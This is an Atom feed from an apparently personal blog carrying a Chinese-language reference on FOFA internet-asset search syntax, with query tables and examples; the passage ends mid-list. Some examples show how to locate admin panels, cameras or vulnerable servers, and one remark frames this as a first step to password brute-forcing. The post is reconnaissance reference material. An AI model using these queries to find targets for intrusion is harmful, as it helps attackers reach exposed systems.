<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Eviden🥝</title>
  
  
  <link href="https://github.com/Eviden0/new-webpage/atom.xml" rel="self"/>
  
  <link href="https://github.com/Eviden0/new-webpage/"/>
  <updated>2024-07-08T10:05:42.144Z</updated>
  <id>https://github.com/Eviden0/new-webpage/</id>
  
  <author>
    <name>Eviden🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fofa查询语法</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e2a5fe45.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e2a5fe45.html</id>
    <published>2024-07-08T09:35:00.000Z</published>
    <updated>2024-07-08T10:05:42.144Z</updated>
    
    <content type="html"><![CDATA[<div class="table-container"><table><thead><tr><th style="text-align:left">基础类（General）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">ip</td><td><a href="https://fofa.info/result?qbase64=aXA9IjEuMS4xLjEi">ip=”1.1.1.1”</a></td><td>通过单一IPv4地址进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXA9IjIyMC4xODEuMTExLjEvMjQi">ip=”220.181.111.1/24”</a></td><td>通过IPv4 C段进行查询</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXA9IjI2MDA6OTAwMDoyMDJhOjI2MDA6MTg6NGFiNzpmNjAwOjkzYTEi">ip=”2600:9000:202a:2600:18:4ab7:f600:93a1”</a></td><td>通过单一Ipv6地址进行查询</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left">port</td><td><a href="https://fofa.info/result?qbase64=cG9ydD0iNjM3OSI=">port=”6379”</a></td><td>通过端口号进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">domain</td><td><a href="https://fofa.info/result?qbase64=ZG9tYWluPSJxcS5jb20i">domain=”qq.com”</a></td><td>通过根域名进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">host</td><td><a href="https://fofa.info/result?qbase64=aG9zdD0iLmZvZmEuaW5mbyI=">host=”.fofa.info”</a></td><td>通过主机名进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">os</td><td><a href="https://fofa.info/result?qbase64=b3M9ImNlbnRvcyI=">os=”centos”</a></td><td>通过操作系统进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">server</td><td><a href="https://fofa.info/result?qbase64=c2VydmVyPSJNaWNyb3NvZnQtSUlTLzEwIg==">server=”Microsoft-IIS/10”</a></td><td>通过服务器进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">asn</td><td><a href="https://fofa.info/result?qbase64=YXNuPSIxOTU1MSI=">asn=”19551”</a></td><td>通过自治系统号进行搜索</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">org</td><td><a href="https://fofa.info/result?qbase64=b3JnPSJMTEMgQmF4ZXQi">org=”LLC Baxet”</a></td><td>通过所属组织进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">is_domain</td><td><a href="https://fofa.info/result?qbase64=aXNfZG9tYWluPXRydWU=">is_domain=true</a></td><td>筛选拥有域名的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfZG9tYWluPWZhbHNl">is_domain=false</a></td><td>筛选没有域名的资产</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">is_ipv6</td><td><a href="https://fofa.info/result?qbase64=aXNfaXB2Nj10cnVl">is_ipv6=true</a></td><td>筛选是ipv6的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfaXB2Nj1mYWxzZQ==">is_ipv6=false</a></td><td>筛选是ipv4的资产</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">标记类（Special Label）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">app</td><td><a href="https://fofa.info/result?qbase64=YXBwPSJNaWNyb3NvZnQtRXhjaGFuZ2Ui">app=”Microsoft-Exchange”</a></td><td>通过FOFA整理的规则进行查询</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">fid</td><td><a href="https://fofa.info/result?qbase64=ZmlkPSJzU1hYR05VTzJGZWZCVGNDTElULzJRPT0i">fid=”sSXXGNUO2FefBTcCLIT/2Q==”</a></td><td>通过FOFA聚合的站点指纹进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">product</td><td><a href="https://fofa.info/result?qbase64=cHJvZHVjdD0iTkdJTlgi">product=”NGINX”</a></td><td>通过FOFA标记的产品名进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">category</td><td><a href="https://fofa.info/result?qbase64=Y2F0ZWdvcnk9IuacjeWKoSI=">category=”服务”</a></td><td>通过FOFA标记的分类进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">type</td><td><a href="https://fofa.info/result?qbase64=dHlwZT0ic2VydmljZSI=">type=”service”</a></td><td>筛选协议资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=dHlwZT0ic3ViZG9tYWluIg==">type=”subdomain”</a></td><td>筛选服务（网站类）资产</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">cloud_name</td><td><a href="https://fofa.info/result?qbase64=Y2xvdWRfbmFtZT0iQWxpeXVuZHVuIg==">cloud_name=”Aliyundun”</a></td><td>通过云服务商进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">is_cloud</td><td><a href="https://fofa.info/result?qbase64=aXNfY2xvdWQ9dHJ1ZQ==">is_cloud=true</a></td><td>筛选是云服务的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfY2xvdWQ9ZmFsc2U=">is_cloud=false</a></td><td>筛选不是云服务的资产</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">is_fraud</td><td><a href="https://fofa.info/result?qbase64=aXNfZnJhdWQ9dHJ1ZQ==">is_fraud=true</a></td><td>筛选是仿冒垃圾站群的资产 （专业版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfZnJhdWQ9ZmFsc2U=">is_fraud=false</a></td><td>筛选不是仿冒垃圾站群的资产（已默认筛选）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">is_honeypot</td><td><a href="https://fofa.info/result?qbase64=aXNfaG9uZXlwb3Q9dHJ1ZQ==">is_honeypot=true</a></td><td>筛选是蜜罐的资产 （专业版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=aXNfaG9uZXlwb3Q9ZmFsc2U=">is_honeypot=false</a></td><td>筛选不是蜜罐的资产（已默认筛选）</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">协议类 （type=service)</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">protocol</td><td><a href="https://fofa.info/result?qbase64=cHJvdG9jb2w9InF1aWMi">protocol=”quic”</a></td><td>通过协议名称进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">banner</td><td><a href="https://fofa.info/result?qbase64=YmFubmVyPSJ1c2VycyI=">banner=”users”</a></td><td>通过协议返回信息进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">base_protocol</td><td><a href="https://fofa.info/result?qbase64=YmFzZV9wcm90b2NvbD0idWRwIg==">base_protocol=”udp”</a></td><td>查询传输层为udp协议的资产</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=YmFzZV9wcm90b2NvbD0idGNwIg==">base_protocol=”tcp”</a></td><td>查询传输层为tcp协议的资产</td><td>✓</td><td>✓</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">网站类（type=subdomain）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">title</td><td><a href="https://fofa.info/result?qbase64=dGl0bGU9ImJlaWppbmci">title=”beijing”</a></td><td>通过网站标题进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">header</td><td><a href="https://fofa.info/result?qbase64=aGVhZGVyPSJlbGFzdGljIg==">header=”elastic”</a></td><td>通过响应标头进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">header_hash</td><td><a href="https://fofa.info/result?qbase64=aGVhZGVyX2hhc2g9IjEyNTg4NTQyNjUi">header_hash=”1258854265”</a></td><td>通过http/https响应头计算的hash值进行查询 （个人版及以上）</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">body</td><td><a href="https://fofa.info/result?qbase64=Ym9keT0i572R57uc56m66Ze05rWL57uYIg==">body=”网络空间测绘”</a></td><td>通过HTML正文进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">body_hash</td><td><a href="https://fofa.info/result?qbase64=Ym9keV9oYXNoPSItMjA5MDk2MjQ1MiI=">body_hash=”-2090962452”</a></td><td>通过HTML正文计算的hash值进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">js_name</td><td><a href="https://fofa.info/result?qbase64=anNfbmFtZT0ianMvanF1ZXJ5LmpzIg==">js_name=”js/jquery.js”</a></td><td>通过HTML正文包含的JS进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">js_md5</td><td><a href="https://fofa.info/result?qbase64=anNfbWQ1PSI4MmFjM2YxNDMyN2E4YjdiYTQ5YmFhMjA4ZDRlYWExNSI=">js_md5=”82ac3f14327a8b7ba49baa208d4eaa15”</a></td><td>通过JS源码进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cname</td><td><a href="https://fofa.info/result?qbase64=Y25hbWU9ImFwMjEuaW5zdC5zaXRlZm9yY2UuY29tIg==">cname=”ap21.inst.siteforce.com”</a></td><td>通过别名记录进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cname_domain</td><td><a href="https://fofa.info/result?qbase64=Y25hbWVfZG9tYWluPSJzaXRlZm9yY2UuY29tIg==">cname_domain=”siteforce.com”</a></td><td>通过别名记录解析的主域名进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">icon_hash</td><td><a href="https://fofa.info/result?qbase64=aWNvbl9oYXNoPSItMjQ3Mzg4ODkwIg==">icon_hash=”-247388890”</a></td><td>通过网站图标的hash值进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">status_code</td><td><a href="https://fofa.info/result?qbase64=c3RhdHVzX2NvZGU9IjQwMiI=">status_code=”402”</a></td><td>筛选服务状态为402的服务（网站）资产</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">icp</td><td><a href="https://fofa.info/result?qbase64=aWNwPSLkuqxJQ1Dor4EwMzAxNzPlj7ci">icp=”京ICP证030173号”</a></td><td>通过HTML正文包含的ICP备案号进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">sdk_hash</td><td><a href="https://fofa.info/result?qbase64=c2RrX2hhc2g9PSJNa2I0TXM0Ujk2Z2x2L1Q2VFJ6d1BXaDNVRGF0QnFlRiI=">sdk_hash==”Mkb4Ms4R96glv/T6TRzwPWh3UDatBqeF”</a></td><td>通过网站嵌入的第三方代码计算的hash值进行查询 （商业版及以上）</td><td>✓</td><td>✓</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">地理位置（Location）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">country</td><td><a href="https://fofa.info/result?qbase64=Y291bnRyeT0iQ04i">country=”CN”</a></td><td>通过国家的简称代码进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y291bnRyeT0i5Lit5Zu9Ig==">country=”中国”</a></td><td>通过国家中文名称进行查询</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left">region</td><td><a href="https://fofa.info/result?qbase64=cmVnaW9uPSJaaGVqaWFuZyI=">region=”Zhejiang”</a></td><td>通过省份/地区英文名称进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=cmVnaW9uPSLmtZnmsZ8i">region=”浙江”</a></td><td>通过省份/地区中文名称进行查询（仅支持中国地区）</td><td>✓</td><td>✓</td><td>-</td><td></td></tr><tr><td style="text-align:left">city</td><td><a href="https://fofa.info/result?qbase64=Y2l0eT0iSGFuZ3pob3Ui">city=”Hangzhou”</a></td><td>通过城市英文名称进行查询</td><td>✓</td><td>✓</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">证书类</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">cert</td><td><a href="https://fofa.info/result?qbase64=Y2VydD0iYmFpZHUi">cert=”baidu”</a></td><td>通过证书进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.subject</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5zdWJqZWN0PSJPcmFjbGUgQ29ycG9yYXRpb24i">cert.subject=”Oracle Corporation”</a></td><td>通过证书的持有者进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.issuer</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc3N1ZXI9IkRpZ2lDZXJ0Ig==">cert.issuer=”DigiCert”</a></td><td>通过证书的颁发者进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.subject.org</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5zdWJqZWN0Lm9yZz0iT3JhY2xlIENvcnBvcmF0aW9uIg==">cert.subject.org=”Oracle Corporation”</a></td><td>通过证书持有者的组织进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.subject.cn</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5zdWJqZWN0LmNuPSJiYWlkdS5jb20i">cert.subject.cn=”baidu.com”</a></td><td>通过证书持有者的通用名称进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.issuer.org</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc3N1ZXIub3JnPSJjUGFuZWwsIEluYy4i">cert.issuer.org=”cPanel, Inc.”</a></td><td>通过证书颁发者的组织进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.issuer.cn</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc3N1ZXIuY249IlN5bm9sb2d5IEluYy4gQ0Ei">cert.issuer.cn=”Synology Inc. CA”</a></td><td>通过证书颁发者的通用名称进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">cert.is_valid</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc192YWxpZD10cnVl">cert.is_valid=true</a></td><td>筛选证书是有效证书的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y2VydC5pc192YWxpZD1mYWxzZQ==">cert.is_valid=false</a></td><td>筛选证书是无效证书的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">cert.is_match</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc19tYXRjaD10cnVl">cert.is_match=true</a></td><td>筛选证书和域名匹配的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y2VydC5pc19tYXRjaD1mYWxzZQ==">cert.is_match=false</a></td><td>筛选证书和域名不匹配的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">cert.is_expired</td><td><a href="https://fofa.info/result?qbase64=Y2VydC5pc19leHBpcmVkPXRydWU=">cert.is_expired=true</a></td><td>筛选证书已过期的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left"><a href="https://fofa.info/result?qbase64=Y2VydC5pc19leHBpcmVkPWZhbHNl">cert.is_expired=false</a></td><td>筛选证书未过期的资产 （个人版及以上）</td><td>✓</td><td>-</td><td>-</td><td></td></tr><tr><td style="text-align:left">jarm</td><td><a href="https://fofa.info/result?qbase64=amFybT0iMmFkMmFkMDAwMmFkMmFkMjJjMmFkMmFkMmFkMmFkMmVhYzkyZWMzNGJjYzBjZjc1MjBlOTc1NDdmODNlODEi">jarm=”2ad2ad0002ad2ad22c2ad2ad2ad2ad2eac92ec34bcc0cf7520e97547f83e81”</a></td><td>通过JARM指纹进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td style="text-align:left">tls.version</td><td><a href="https://fofa.info/result?qbase64=dGxzLnZlcnNpb249IlRMUyAxLjMi">tls.version=”TLS 1.3”</a></td><td>通过tls的协议版本进行查询</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">tls.ja3s</td><td><a href="https://fofa.info/result?qbase64=dGxzLmphM3M9IjE1YWY5NzdjZTI1ZGU0NTJiOTZhZmZhMmFkZGIxMDM2Ig==">tls.ja3s=”15af977ce25de452b96affa2addb1036”</a></td><td>通过tls的ja3s指纹进行查询</td><td>✓</td><td>✓</td><td>✓</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">时间类（Last update time）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">after</td><td><a href="https://fofa.info/result?qbase64=YWZ0ZXI9IjIwMjMtMDEtMDEi">after=”2023-01-01”</a></td><td>筛选某一时间之后有更新的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">before</td><td><a href="https://fofa.info/result?qbase64=YmVmb3JlPSIyMDIzLTEyLTAxIg==">before=”2023-12-01”</a></td><td>筛选某一时间之前有更新的资产</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">after&amp;before</td><td><a href="https://fofa.info/result?qbase64=YWZ0ZXI9IjIwMjMtMDEtMDEiICYmIGJlZm9yZT0iMjAyMy0xMi0wMSI=">after=”2023-01-01” &amp;&amp; before=”2023-12-01”</a></td><td>筛选某一时间区间有更新的资产</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:left">独立IP语法（独立IP系列语法，不可和上面其他语法共用）</th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">语法</td><td>例句</td><td>用途说明</td><td>=</td><td>!=</td><td>*=</td></tr><tr><td style="text-align:left">port_size</td><td><a href="https://fofa.info/result?qbase64=cG9ydF9zaXplPSI2Ig==">port_size=”6”</a></td><td>筛选开放端口数量等于6个的独立IP （个人版及以上）</td><td>✓</td><td>✓</td><td>-</td></tr><tr><td style="text-align:left">port_size_gt</td><td><a href="https://fofa.info/result?qbase64=cG9ydF9zaXplX2d0PSI2Ig==">port_size_gt=”6”</a></td><td>筛选开放端口数量大于6个的独立IP （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">port_size_lt</td><td><a href="https://fofa.info/result?qbase64=cG9ydF9zaXplX2x0PSIxMiI=">port_size_lt=”12”</a></td><td>筛选开放端口数量小于12个的独立IP （个人版及以上）</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_ports</td><td><a href="https://fofa.info/result?qbase64=aXBfcG9ydHM9IjgwLDE2MSI=">ip_ports=”80,161”</a></td><td>筛选同时开放不同端口的独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_country</td><td><a href="https://fofa.info/result?qbase64=aXBfY291bnRyeT0iQ04i">ip_country=”CN”</a></td><td>通过国家的简称代码进行查询独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_region</td><td><a href="https://fofa.info/result?qbase64=aXBfcmVnaW9uPSJaaGVqaWFuZyI=">ip_region=”Zhejiang”</a></td><td>通过省份/地区英文名称进行查询独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_city</td><td><a href="https://fofa.info/result?qbase64=aXBfY2l0eT0iSGFuZ3pob3Ui">ip_city=”Hangzhou”</a></td><td>通过城市英文名称进行查询独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_after</td><td><a href="https://fofa.info/result?qbase64=aXBfYWZ0ZXI9IjIwMjEtMDMtMTgi">ip_after=”2021-03-18”</a></td><td>筛选某一时间之后有更新的独立IP</td><td>✓</td><td>-</td><td>-</td></tr><tr><td style="text-align:left">ip_before</td><td><a href="https://fofa.info/result?qbase64=aXBfYmVmb3JlPSIyMDE5LTA5LTA5Ig==">ip_before=”2019-09-09”</a></td><td>筛选某一时间之前有更新的独立IP</td><td>✓</td><td>-</td><td>-</td></tr></tbody></table></div><h1 id="FOFA-是什么？"><a href="#FOFA-是什么？" class="headerlink" title="FOFA 是什么？"></a>FOFA 是什么？</h1><p>FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。<br>FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共ip的打印机，网络摄像头，门禁系统，Web服务 ……<br>FOFA 这类搜索引擎又有另一个名字：网络空间测绘系统。—— 它们就像是现实生活中的卫星地图那样，一点点勾勒出公共网络空间的样子，每一个网站、每一台公共环境下的服务器……当一个高危漏洞爆发，FOFA系统便能向卫星定位地址一样，通过特征迅速找到全网的脆弱设备。<br>网站：<a href="https://fofa.so/">https://fofa.so/</a> FOFA不仅提供了在线搜索还提供了FOFA Pro客户端版本<br><a href="https://redyanly.github.io/images/111.jpg"><img src="https://redyanly.github.io/images/111.jpg" alt="111"></a></p><p>注意：<br>1) 普通会员和高级会员的 免费100条 和 免费10000条 是指每天调用API可以免费获取前100条和前10000条,假设高级会员调用API,每页获取3333条，第1、2、3页由于没有超过前10000条，所以免费，第4页超过前10000条，所以会扣除1FOFA币。<br>2) 直接下载数据，无论多少条数据，都要花费FOFA币。<br>普通会员300 高级会员1000 终身制 。</p><h1 id="查询语法介绍"><a href="#查询语法介绍" class="headerlink" title="查询语法介绍"></a>查询语法介绍</h1><h2 id="1、怎么搜？"><a href="#1、怎么搜？" class="headerlink" title="1、怎么搜？"></a>1、怎么搜？</h2><p>首先FOFA作为一个搜索引擎，我们要熟悉它的查询语法，类似google语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。目前支持的检索字段包括：domain，host，ip，title，server，header，body，port，cert，country，city，os，appserver，middleware，language，tags，user_tag等等，支持的逻辑运算符包括：= ，==，!= ，&amp;&amp;，||。了解了检索字段和逻辑运算符之后，就基本掌握了FOFA的用法了。例如搜索title字段中存在后台的网站，我们只需要在输入栏中输入title=”后台”，输出的结果即为全网title中存在后台两个字的网站，对于黑客而言，可以利用得到的信息可以继续进行渗透攻击，对于网站的后台进行密码暴力破解，密码找回等等攻击行为，这样就可以轻松愉快的开始一次简单渗透攻击之旅，而企业用户也可以利用得到的信息进行内部的弱口令排查等等，防范于未然。</p><p>下面为大家一一介绍目前支持的所有检索字段的用法：</p><h3 id="1-1-domain"><a href="#1-1-domain" class="headerlink" title="1.1 domain"></a>1.1 domain</h3><p>例:搜索QQ所有的子域名 : domain=”qq.com”</p><h3 id="1-2-host"><a href="#1-2-host" class="headerlink" title="1.2 host"></a>1.2 host</h3><p>例:搜索host内所有带有qq.com的域名: host=”qq.com”</p><h3 id="1-3-ip"><a href="#1-3-ip" class="headerlink" title="1.3 ip"></a>1.3 ip</h3><p>例:搜索某个IP上的相关信息 ip=”58.63.236.248”<br>支持IP段搜索<br>ip=”111.1.1.1/8”<br>ip=”111.1.1.1/16”<br>ip=”111.1.1.1/24”</p><h3 id="1-4-title"><a href="#1-4-title" class="headerlink" title="1.4 title"></a>1.4 title</h3><p>例:搜索title包含有”漏洞”的IP title=”漏洞”</p><h3 id="1-5-server"><a href="#1-5-server" class="headerlink" title="1.5 server"></a>1.5 server</h3><p>例:Apache出来了一个高危漏洞,我们需要去统计全球的Apache server=”Apache”</p><h3 id="1-6-header"><a href="#1-6-header" class="headerlink" title="1.6 header"></a>1.6 header</h3><p>例:搜索前段时间非常火的海康威视 header=”Hikvision”</p><h3 id="1-7-body"><a href="#1-7-body" class="headerlink" title="1.7 body"></a>1.7 body</h3><p>例:假如我想搜索微博的后台,域名为:weibo.com并且网页内body包含”后台” body=”后台” &amp;&amp; domain=”weibo.com”</p><p>&amp;&amp;:与body=”后台” &amp;&amp; domain=”weibo.com” 提取域名为:weibo.com并且网页内body包含”后台”的网站 需要同时满足两个条件</p><h3 id="1-8-port"><a href="#1-8-port" class="headerlink" title="1.8 port"></a>1.8 port</h3><p>例:想要找非80端口 port!=”80”</p><p>!=: port!=”80”匹配端口不为80端口的服务</p><h3 id="1-9-cert"><a href="#1-9-cert" class="headerlink" title="1.9 cert"></a>1.9 cert</h3><p>搜索证书(https或者imaps等)</p><p>例:百度公司为了检查自己的域名是否还有心脏出血漏洞可以使用语法: cert=”baidu”</p><h3 id="1-10country"><a href="#1-10country" class="headerlink" title="1.10country"></a>1.10country</h3><p>搜索指定国家(编码)的资产</p><p>例:搜索中国的服务器 country=”CN”</p><p>注:country=”CN” country后面的规则为各国家的缩写,全球国家缩写如下链接:</p><p><a href="https://zhidao.baidu.com/question/538403206.html">https://zhidao.baidu.com/question/538403206.html</a></p><h3 id="1-11-city"><a href="#1-11-city" class="headerlink" title="1.11 city"></a>1.11 city</h3><p>搜索指定城市的资产</p><p>例:搜索上海的服务器 city=”Shanghai”</p><p>注:搜索城市时填写城市的全称,首字母必须大写!</p><h3 id="1-12-os"><a href="#1-12-os" class="headerlink" title="1.12 os"></a>1.12 os</h3><p>例:搜索centos所有主机 os=”centos”</p><p>了解了基础查询我们再来谈谈高级查询，其实也很简单，就是多个基础查询语句用逻辑连接符拼成的语句，例如我们要搜索上海的Discus组件，搜索语句是(title=”Discuz”||body=”content=”Discuz”) &amp;&amp; city=”Shanghai”</p><h3 id="amp-amp-逻辑与"><a href="#amp-amp-逻辑与" class="headerlink" title="&amp;&amp;:逻辑与"></a>&amp;&amp;:逻辑与</h3><h3 id="：逻辑或"><a href="#：逻辑或" class="headerlink" title="||：逻辑或"></a>||：逻辑或</h3><p>上面的语句意思为 (title=”Discuz”||body=”content=”Discuz”)与city=”Shanghai”这两个条件必须同时满足，(title=”Discuz”||body=”content=”Discuz”)中title=”Discuz” 与body=”content=”Discuz”满足一个即可。<br>利用高级搜索可以更细致的了解网络空间中每个用户关注的资产信息。</p><h2 id="2、搜什么？"><a href="#2、搜什么？" class="headerlink" title="2、搜什么？"></a>2、搜什么？</h2><p>FOFA可以从不同维度搜索网络组件，例如地区，端口号，网络服务，操作系统，网络协议等等。目前FOFA支持了多个网络组件的指纹识别，包括建站模块、分享模块、各种开发框架、安全监测平台、项目管理系统、企业管理系统、视频监控系统、站长平台、电商系统、广告联盟、前端库、路由器、SSL证书、服务器管理系统、CDN、Web服务器、WAF、CMS等等，详细信息可见（<a href="https://fofa.so/library）。">https://fofa.so/library）。</a></p><h3 id="网站模块"><a href="#网站模块" class="headerlink" title="网站模块"></a>网站模块</h3><p>pagespeed， mod_bwlimited， mod_auth_passthrough， mod_auth_pam， mod_fastcgi， mod_jk， mod_perl， mod_python， mod_rack， mod_rails， mod_ssl， mod_wsgi， mod_antiloris，</p><h3 id="广告联盟"><a href="#广告联盟" class="headerlink" title="广告联盟"></a>广告联盟</h3><p>doubleclick_ad， baidu广告联盟， Google_AdSense， Open_AdStream， adinfinity， adriver，</p><h3 id="反向代理服务器"><a href="#反向代理服务器" class="headerlink" title="反向代理服务器"></a>反向代理服务器</h3><p>squid， kangle反向代理， Varnish， Aicache， SJSWPS_ OiWPS， HAProxy_Report，</p><h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><p>PHP， ASP.NET， python， ruby， 